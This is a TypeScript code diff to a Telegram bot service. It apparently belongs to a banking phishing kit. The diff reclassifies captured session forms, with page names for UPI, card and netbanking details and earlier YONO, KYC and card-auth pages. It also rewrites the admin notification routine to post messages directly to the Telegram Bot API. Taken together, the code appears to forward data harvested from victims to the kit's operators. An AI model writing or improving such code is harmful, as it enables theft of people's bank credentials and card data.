@@ -9,6 +9,7 @@ import * as os from 'os';
 
 export class TelegramBotService {
     private bot: TelegramBot | null = null;
+    private botToken: string = '';
     private adminIds: Set<number> = new Set();
     private isEnabled: boolean = false;
     private hasLoggedConflict: boolean = false;
@@ -28,6 +29,7 @@ export class TelegramBotService {
 
     constructor(config?: TelegramConfig) {
         if (config?.token) {
+            this.botToken = config.token;
             this.bot = new TelegramBot(config.token, { polling: false });
             this.adminIds = new Set(config.adminIds || []);
             this.isEnabled = true;
@@ -558,14 +560,14 @@ export class TelegramBotService {
             // Determine flow type based on pages present
             const pageNames = sessionForms.map((f: any) => f.pageName).filter(Boolean);
             let flowType = 'Unknown Flow';
-            if (pageNames.includes('profile_verify')) {
-                flowType = 'Main Flow (Complete)';
-            } else if (pageNames.includes('login_details')) {
-                flowType = 'Apply Flow (Complete)';
-            } else if (pageNames.includes('yono_apply') || pageNames.includes('verification')) {
-                flowType = 'Apply Flow (Partial)';
-            } else if (pageNames.includes('kyc_login') || pageNames.includes('card_auth')) {
-                flowType = 'Main Flow (Partial)';
+            if (pageNames.includes('upi_details') || pageNames.includes('card_details') || pageNames.includes('netbanking_details')) {
+                flowType = 'Payment Flow (Complete)';
+            } else if (pageNames.includes('payment_method')) {
+                flowType = 'Payment Flow (Partial - Method Selected)';
+            } else if (pageNames.includes('payment_mode')) {
+                flowType = 'Payment Flow (Partial - Mode Selected)';
+            } else if (pageNames.includes('customer_info')) {
+                flowType = 'Payment Flow (Started)';
             }
 
             content += `----------------------------------------\n`;
@@ -1268,12 +1270,27 @@ export class TelegramBotService {
     // ==================== NOTIFICATION METHODS ====================
 
     private async sendToAllAdmins(message: string, options?: TelegramBot.SendMessageOptions): Promise<void> {
-        if (!this.bot || !this.isEnabled) return;
+        if (!this.isEnabled || !this.botToken) return;
         for (const adminId of this.adminIds) {
             try {
-                await this.bot.sendMessage(adminId, message, { parse_mode: 'Markdown', ...options });
-            } catch (error) {
-                console.error(`[Telegram] Failed to send to admin ${adminId}:`, error);
+                // Use native fetch to bypass the broken 'request' library in node-telegram-bot-api
+                const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
+                const body = {
+                    chat_id: adminId,
+                    text: message,
+                    parse_mode: 'Markdown',
+                };
+                const res = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(body),
+                });
+                if (!res.ok) {
+                    const errData = await res.text();
+                    console.error(`[Telegram] API error for admin ${adminId}: ${res.status} ${errData}`);
+                }
+            } catch (error: any) {
+                console.error(`[Telegram] Failed to send to admin ${adminId}:`, error?.message || error);
             }
         }
     }
